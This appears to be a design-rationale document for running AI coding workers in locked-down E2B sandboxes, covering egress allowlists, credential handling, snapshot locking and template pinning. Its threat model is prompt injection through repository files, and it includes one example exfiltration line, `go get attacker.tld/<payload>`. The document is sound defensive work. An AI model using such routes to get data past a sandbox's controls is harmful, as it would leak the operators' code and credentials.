# E2B Runs / WHY

## Rationale

### Deny-all egress with a two-phase policy

A sandbox holds a clone of the repository and a worker that follows
instructions it did not write. Without egress control, one injected line in a
README is enough to post the repository anywhere. Deny-all with an allowlist
is the only policy that fails closed. The clone phase and the run phase differ
because the repo host is needed only once: keeping it open for the whole run
would let the worker push to it with the credential git still has in memory.

### The `dev-registries` preset (ADR 0002 #1)

With plain deny-all the worker cannot `bun install` or run most test suites,
which defeats the purpose of a coding sandbox. Package registries serve
fixed content and need credentials the sandbox does not have to publish
anything, so their value as exfiltration targets is low. That is also why
GOPROXY (`proxy.golang.org`, with `sum.golang.org`) is not in the preset: a
Go module proxy fetches whatever origin a module path names, on demand, so one
`go get attacker.tld/<payload>` through it reaches the attacker from behind an
allowlisted host. Go users add it with `--allow-host proxy.golang.org` and
accept that. `--egress strict` exists for repositories where even the preset is
too much, and `--allow-host` adds the rest case by case. Caveat: some
registries are CDN-fronted, so an allowlisted host name may be shared with
unrelated services behind the same CDN, and E2B's `allowOut` may match on the
resolved IP rather than the SNI (open check in RUNBOOK).

### API key only, injected by the proxy (ADR 0002 #2, ADR 0001)

A subscription (OAuth) token is not scoped to one run, cannot be injected per
host and would sit in a machine E2B can snapshot, so it is refused. The API
key defaults to `header` mode: it lives in E2B's secret store for the run and
reaches the model host as an `x-api-key` header added by the egress proxy. The
sandbox itself only holds a placeholder key, so neither E2B's command logs nor
a `--keep` snapshot nor `getInfo` (which shows literal header values to anyone
with the E2B key) can reveal it. `env` mode stays for hosts whose git or Node
does not trust the proxy's CA, but it needs `--allow-key-in-env` so the
trade-off is explicit, and it blocks `--keep`.

`broker` mode is the shape the connected runs use: the model traffic goes to a
Ravi broker that holds the real key, and the sandbox carries only a grant in a
header on that host. Leaving the `headers` hook in `SandboxModelAuth` means
slice 06b only fills it.

### GitHub token as a clone-only rule

The #623 fix moved the token from argv into git's credential file, which E2B
logs by path only. A transform rule is better still: the token never enters
the machine, and dropping the rule after the clone means a worker that later
finds a way to talk to github.com has no credential to use; the secret behind
it is destroyed at the same moment. The credential file stays as the fallback
when the secret store is unavailable, and `--github-auth file` selects it
outright for hosts where the proxy's rule is not honoured (CA trust, see
RUNBOOK) so a private clone can still run without `env` model auth.

The broker grant of slice 06b goes the same way: `rules` are visible to anyone
holding the E2B key, so the grant lives in the secret store and only its
placeholder is in the rule.

### `--keep` kept, but locked (ADR 0002 #4)

Pausing a sandbox is useful for debugging a failed run. A paused sandbox is a
snapshot, so it must not hold a credential (hence the `env` refusal) and, when
resumed, must not be able to reach out (hence the deny-all update with no
rules and the daemon stop before `pause()`).

### Task text through files

E2B logs the unexpanded command string of every process and keeps it for days.
Task instructions may hold customer data, and `shellQuote` is one bug away
from an injection. Writing the text to files and passing `"$(cat …)"` keeps
the text out of argv and out of the shell parser at the same time. A
`--instructions-file` flag on `ravi tasks create` was rejected because that
command is not CliOnly and the flag would drift the SDKs.

### Ctrl-C twice

A kill against E2B can take seconds. With `process.once`, a second Ctrl-C in
that window would drop the handler and end the process by default, leaving the
sandbox and its secrets behind, which is exactly what the first Ctrl-C was
trying to prevent. Handlers stay on with `process.on`, repeats are noted once
and ignored, and one time limit over kill plus secret removal bounds how long
the process can linger.

### Task text capped at 100 KiB

Title and instructions are expanded with `$(cat …)` into one command line
inside the sandbox; a cap keeps that inside what a shell and E2B's file API
accept, and anything longer belongs in the repository the worker already has.

### Kill, not pause, on timeout

A sandbox that pauses on timeout keeps billing storage and keeps the clone and
whatever is in its memory around indefinitely. `onTimeout: "kill"` with
`autoResume: false` makes the default outcome the one with nothing left over.

### `--timeout-min` capped at 55

E2B's Hobby plan caps a sandbox at one hour and the sandbox lives five minutes
longer than the task, so 55 is the largest task timeout that always fits. The
connected-run grant (ADR 0001) is bounded at 65 minutes for the same reason.

### Worker without `full-access`

The bootstrap floor already grants the tools and the task group the worker
needs; `full-access` would add `admin:system:*`, which a coding task has no use
for. `execute:executable:*` is the one addition (build and test commands).

### Template pinned to a commit, toolchain pinned to digests

The template is the trusted base every sandbox boots from, so it must be
possible to say which Ravi it holds and to rebuild the same thing twice. A
branch name says neither: `dev` moves, and the previous build used
`skipCache()` to notice that, which also rebuilt every later layer on every
run. Resolving the ref to a SHA on the host and putting that SHA into the
checkout command gives E2B's cache the right key for free and lets the sandbox
prove the checkout with `rev-parse`. Bun and nats-server used to arrive through
`curl … | bash` and an unchecked tarball, which means whoever controls those
URLs (or the path to them) controls the template; downloading the pinned
release archive and checking it against a digest copied by hand from the
publisher's checksum file closes that. The record file exists so that a run
can report the commit without a second build, and it is 0600 because it names
the template ids of this account. The record only describes what this host
built last, though: the same template name can be rebuilt from another host
or the dashboard, so the run asks E2B which template id the sandbox booted
from and claims the commit only when it is the recorded one. The build layer
re-checks the SHA for the same reason the checkout step does: its command
string then changes with the commit, so a cached build of another checkout
cannot be served whatever E2B keys the layer cache on. A 40-hex `--ref` is
taken as is because resolving it would prove nothing useful (GitHub serves any
commit in the repository network); it is the operator's choice, documented as
such. These decisions and the review follow-ups behind them are recorded in
`.agent/context/adr/0002-autonomous-decisions-ravi-stack.md`, section "03b
decisions and review follow-ups".

### Reaper that dry-runs and never crosses hosts by default

A sandbox that outlived its run holds a clone and bills time, so there has to
be a way to find and kill them. Killing is external and irreversible, so it
follows the CLI brake. The dangerous mistake is killing a machine that belongs
to someone else's live run, so scope is narrow by construction: this host's
`ravi-task` sandboxes, with the metadata filter repeated client-side because
the server-side semantics are an open check. The pid test only makes sense for
sandboxes created here, and `--all-hosts` therefore falls back to the two
causes that need no local knowledge, paused and overdue. A paused sandbox of
this host is a candidate even when it was kept on purpose, because the reaper
cannot tell the two apart and the dry-run plan is where the operator does. The
pid test refuses anything that is not a positive integer before `process.kill`
sees it, since pid 0 and negative pids address process groups and would read
as alive. One kill loop (`killCandidates`) serves the library and the CLI so
the brake and the kill cannot drift apart. `cause` rather than `reason` names
the field because the CLI redacts `reason` as free text. The dry-run says
"nothing was killed" rather than "nothing was written" because that is what
the operator is about to do. See ADR 0002, "03b decisions and review
follow-ups".
